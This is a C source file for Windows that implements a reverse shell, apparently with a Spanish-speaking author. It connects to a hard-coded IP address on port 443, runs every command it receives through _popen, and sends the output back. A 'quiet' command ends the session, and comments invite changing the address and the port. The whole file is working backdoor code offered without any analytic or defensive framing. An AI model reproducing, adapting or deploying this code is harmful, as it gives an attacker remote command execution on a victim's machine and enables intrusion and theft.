#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define MAX_BUFFER_SIZE 1024

void handleCommands(SOCKET sock) {
    char command[MAX_BUFFER_SIZE];
    char response[MAX_BUFFER_SIZE];
    
    while (1) {
        memset(command, 0, sizeof(command));
        memset(response, 0, sizeof(response));
        
        int bytesReceived = recv(sock, command, sizeof(command), 0);
        if (bytesReceived <= 0) {
            break;
        }
        
        if (strcmp("quiet", command) == 0) {
            break;
        } else {
            FILE *fp = _popen(command, "r");
            if (fp != NULL) {
                while (fgets(response, sizeof(response), fp) != NULL) {
                    send(sock, response, strlen(response), 0);
                    memset(response, 0, sizeof(response));
                }
                _pclose(fp);
            }
        }
    }
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(443);  // Cambia el puerto si es necesario
    serverAddr.sin_addr.s_addr = inet_addr("192.168.18.228"); // Cambia esta dirección

    if (connect(sock, (struct sockaddr *) &serverAddr, sizeof(serverAddr)) != 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    handleCommands(sock);

    closesocket(sock);
    WSACleanup();

    return 0;
}
